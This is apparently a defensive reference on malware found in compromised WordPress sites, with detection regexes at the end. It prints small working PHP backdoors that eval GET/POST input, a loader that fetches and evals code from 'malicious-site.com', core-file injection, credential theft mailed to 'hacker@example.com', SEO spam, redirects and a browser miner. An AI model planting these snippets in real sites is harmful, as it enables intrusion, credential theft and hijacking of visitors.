# WordPress Malware Patterns Reference

Common malicious code patterns found in compromised WordPress installations.

## Obfuscation Techniques

### Base64 Encoding
```php
$code = base64_decode('cGhwaW5mbygpOw==');
eval($code);
```

### ROT13 + Base64
```php
$code = base64_decode(str_rot13('...'));
eval($code);
```

### Compressed Payloads
```php
$code = gzuncompress(base64_decode('...'));
eval($code);
```

### String Manipulation
```php
$code = strrev(base64_decode('...'));
eval($code);
```

## Backdoor Patterns

### Simple Backdoor
```php
if(isset($_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

### Password Protected Backdoor
```php
if($_POST['pass'] == 'hacker123') {
    eval($_POST['code']);
}
```

### Remote Shell
```php
$url = 'http://malicious-site.com/shell.php';
$code = file_get_contents($url);
eval($code);
```

## File Manipulation

### .htaccess Injection
```php
$htaccess = base64_decode('...');
file_put_contents('.htaccess', $htaccess);
```

### Core File Modification
```php
$malicious_code = '<?php eval($_GET["x"]); ?>';
file_put_contents('wp-load.php', $malicious_code, FILE_APPEND);
```

## Data Exfiltration

### Stealing Credentials
```php
$data = serialize($_POST);
mail('hacker@example.com', 'Stolen Data', $data);
```

### Database Dump
```php
$db = file_get_contents('wp-config.php');
file_put_contents('/tmp/db.txt', $db);
```

## SEO Spam Injection

### Hidden Links
```php
echo '<div style="display:none">';
echo '<a href="spam-site.com">Spam Link</a>';
echo '</div>';
```

### Content Injection
```php
add_filter('the_content', function($content) {
    return $content . '<a href="spam.com">Spam</a>';
});
```

## Redirect Malware

### Conditional Redirects
```php
if(strpos($_SERVER['HTTP_REFERER'], 'google') !== false) {
    header('Location: http://spam-site.com');
    exit;
}
```

## Crypto Mining

### Browser Miner
```php
echo '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
echo '<script>var miner = new CoinHive.Anonymous("key"); miner.start();</script>';
```

## Detection Regex Patterns

```regex
# Base64 decode followed by eval
base64_decode.*eval

# Suspicious function calls
(eval|exec|system|shell_exec|passthru|assert)\(

# Obfuscated strings
str_rot13|strrev|gzuncompress|gzinflate

# External file includes
(file_get_contents|curl_exec|fopen).*http

# Suspicious file operations
file_put_contents.*\.htaccess
chmod.*0777
```